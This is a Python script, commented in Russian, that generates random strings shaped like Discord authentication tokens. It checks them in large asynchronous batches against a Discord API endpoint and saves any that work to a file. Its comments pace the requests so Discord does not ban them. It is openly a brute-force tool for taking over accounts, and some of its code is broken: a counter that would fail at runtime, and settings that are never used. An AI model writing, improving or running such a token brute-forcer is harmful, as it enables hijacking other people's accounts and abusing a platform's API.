import base64
from random import randint, choices

import time
import asyncio
import aiohttp
import string

from art import tprint
from colorama import Fore
from plyer import notification

# Если True, выводит в консоль все сгенерированные токены, если False, то только валидные
# Отключение немного ускоряет работу скрипта 
PRINT_ALL_TOKENS = False 

PACKETS_COUNT = 10 # сколько будет генерироваться пакетов с токенами, 0 для бесконечной работы.
TOKENS_IN_PACKET = 1000 # сколько будет токенов в одном пакете запросов, рекомендуется 100-1000.
TIMEOUT = 3 # время простоя между запросами пакетов в секундах, чтобы не забанил api дискорда, желательно ставить хотя бы 1 секунду

tprint(f"TOKEN GENERATOR", font='modular')

def gen_first():
    sample_string = str(randint(000000000000000000, 999999999999999999))
    encodedBytes = base64.b64encode(sample_string.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    return encodedid
def gen_second():
    return ''.join(choices("XY")+choices(string.ascii_letters + string.digits + "-_", k=5))
def gen_third():
    return ''.join(choices(string.ascii_letters + string.digits + "-_", k=27))

def notify(title, message):
	notification.notify(title = title, message = message,  app_icon="./nitro.ico")

valid_tokens_count = 0
url = "https://discordapp.com/api/v6/users/@me/library"
async def check(token, session):
    async with session.get(url, headers={'Content-Type': 'application/json', 'authorization': token}) as res:
        if res.status != 200:
            if PRINT_ALL_TOKENS:
                return f"{Fore.RED}{token} : INVALID{Fore.RESET}"
            return f"{Fore.RED}В пачке нет валидных токенов...{Fore.RESET}"
        elif res.status == 200:
            with open("Valid tokens.txt", "a") as file:
                file.write(token)
            valid_tokens_count += 1
            return f"{Fore.GREEN}{token} : VALID{Fore.RESET}"
            

async def main():
    async with aiohttp.ClientSession() as session:
        # with open("Tokens.txt", "r") as file:
        for i in range(100):
            tasks = []
            # tokens = file.readlines()
            for j in range(1000):
                # token = tokens[j].removesuffix('\n')
                token = f"{gen_first()}.{gen_second()}.{gen_third()}"
                tasks.append(asyncio.ensure_future(check(token, session)))
            tokens = set(await asyncio.gather(*tasks))
            for token in tokens:
                print(token)
            await asyncio.sleep(5)
        
if __name__ == "__main__":
    start_time = time.time()
    asyncio.get_event_loop().run_until_complete(main())
    print("")
    print(f"{Fore.YELLOW}--- {time.time() - start_time} seconds ---{Fore.RESET}")
